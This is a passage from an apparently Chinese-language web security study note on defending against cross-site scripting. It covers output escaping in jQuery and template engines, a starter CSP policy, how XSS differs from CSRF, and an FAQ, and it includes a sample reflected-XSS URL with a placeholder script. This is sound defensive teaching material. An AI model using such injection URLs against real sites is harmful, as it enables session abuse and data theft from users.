document.write('<script>x="' + jsEscape(untrustedValue) + '";<\/script>');
```

### jQuery 中的 XSS 防御

jQuery 中最常见的 XSS 形式是将用户输入传递给 jQuery 选择器。jQuery 已修补其选择器逻辑，检查输入是否以 `#` 开头，现在 jQuery 仅在第一个字符是 `<` 时渲染 HTML。

**安全实践：**

- 使用 `$().text()` 而非 `$().html()` 设置文本内容
- 如果必须将不可信数据传递给 jQuery 选择器，使用 `jsEscape` 函数正确转义值
- 不使用 `eval()` 解析 JSON（使用 `JSON.parse()`）

### 模板引擎防御

许多现代网站使用服务端模板引擎（如 Twig、Freemarker）在 HTML 中嵌入动态内容。它们通常定义了自己的转义系统。

例如，在 Twig 中，可以使用 `e()` 过滤器，参数定义上下文：

```twig
{{ user.firstname | e('html') }}
```

某些模板引擎（如 Jinja 和 React）默认转义动态内容，有效防止了大多数 XSS 发生。

> **警告：** 如果直接将用户输入拼接到模板字符串中，将面临服务端模板注入（SSTI）的风险，这通常比 XSS 更严重。

### 使用 CSP 作为最后防线

CSP 是防御跨站脚本的最后一道防线。如果 XSS 防御失败，可以使用 CSP 通过限制攻击者的能力来减轻 XSS。

CSP 允许控制各个方面，如是否可以加载外部脚本以及是否执行内联脚本。部署 CSP 需要在响应中包含 `Content-Security-Policy` HTTP 头。

安全的 CSP 起步策略：

```
default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

**关键原则：**

- 资源（图像、脚本等）只能从与主页面相同的源加载
- 即使攻击者注入 XSS payload，也只能从当前源加载资源
- 如果需要加载外部资源，确保仅允许不会帮助攻击者利用站点的脚本
- 尽可能托管资源在自己的域上
- 如果不可能，使用 hash 或 nonce 策略允许不同域上的脚本

---

## XSS 与 CSRF 的区别

### 核心差异

| 维度 | XSS (Cross-Site Scripting) | CSRF (Cross-Site Request Forgery) |
|------|---------------------------|----------------------------------|
| **定义** | 使网站返回恶意 JavaScript，在受害者浏览器中执行 | 诱导受害用户执行其本不打算执行的操作 |
| **严重性** | 通常更严重 | 通常影响范围较小 |
| **作用范围** | 成功利用后可执行用户能够执行的任何操作 | 通常仅适用于用户可以执行的操作子集 |
| **数据流向** | "双向" -- 攻击者注入的脚本可以发出任意请求、读取响应并将数据外泄 | "单向" -- 攻击者可以诱导受害者发出 HTTP 请求，但无法获取该请求的响应 |
| **防御关键** | 输出编码 + 输入验证 + CSP | CSRF 令牌 + SameSite Cookie + Referer 验证 |
| **与同源策略关系** | 绕过同源策略（脚本在目标域上下文中执行） | 部分绕过同源策略（利用浏览器自动携带 Cookie 的行为） |

### CSRF 令牌能否防止 XSS 攻击？

某些 XSS 攻击确实可以通过有效使用 CSRF 令牌来防止。

考虑一个简单的反射型 XSS 漏洞：

```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
```

如果漏洞功能包含了 CSRF 令牌：

```
https://insecure-website.com/status?csrf-token=CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz&message=<script>/*+Bad+stuff+here...+*/</script>
```

假设服务器正确验证 CSRF 令牌并拒绝没有有效令牌的请求，令牌确实可以防止此 XSS 漏洞的利用。关键点在于：**反射型 XSS 涉及跨站请求，通过防止攻击者伪造跨站请求，应用程序防止了 XSS 漏洞的简单利用。**

**重要限制：**

1. 如果站点上其他地方存在未被 CSRF 令牌保护的反射型 XSS 漏洞，该 XSS 仍可被正常利用
2. 如果站点上存在可利用的 XSS 漏洞，即使目标操作本身受 CSRF 令牌保护，XSS 也可以被用来让受害用户执行这些操作（攻击者的脚本可以请求相关页面获取有效 CSRF 令牌）
3. CSRF 令牌**不能防御存储型 XSS**。如果一个受 CSRF 令牌保护的页面同时也是存储型 XSS 的输出点，该 XSS 仍然可以正常利用（攻击者提交恶意数据时不需要 CSRF 令牌来通过存储操作）

---

## XSS 常见问题

| 问题 | 答案 |
|------|------|
| **XSS 漏洞有多常见？** | XSS 漏洞非常常见，XSS 可能是最频繁出现的 Web 安全漏洞 |
| **XSS 攻击有多常见？** | 难以获得关于真实世界 XSS 攻击的可靠数据，但可能比其他漏洞利用频率低 |
| **XSS 和 CSRF 的区别？** | XSS 涉及使网站返回恶意 JavaScript，而 CSRF 涉及诱导受害用户执行其不打算执行的操作 |
| **XSS 和 SQL 注入的区别？** | XSS 是针对其他应用程序用户的客户端漏洞，而 SQL 注入是针对应用程序数据库的服务器端漏洞 |
| **如何在 PHP 中防御 XSS？** | 用白名单过滤输入，使用类型提示或类型转换；用 `htmlentities` 和 `ENT_QUOTES` 对 HTML 上下文进行输出转义，或对 JavaScript 上下文使用 JavaScript Unicode 转义 |
| **如何在 Java 中防御 XSS？** | 用白名单过滤输入，使用 Google Guava 等库对 HTML 上下文进行 HTML 编码输出，或对 JavaScript 上下文使用 JavaScript Unicode 转义 |

---

> **参考：** [CSRF](../Cross-site%20request%20forgery%20(CSRF)/Cross-site%20request%20forgery%20(CSRF).md) | [JavaScript for XSS](./JavaScript%20for%20XSS/JavaScript%20for%20XSS.md) | [DOM and Browser](./DOM%20and%20Browser/DOM%20and%20Browser.md) | [XSS Payloads](./XSS%20Payloads/XSS%20Payloads.md) | [Content Security Policy](./Content%20Security%20Policy/Content%20Security%20Policy.md) | [XSS Prevention](./XSS%20Prevention/XSS%20Prevention.md)
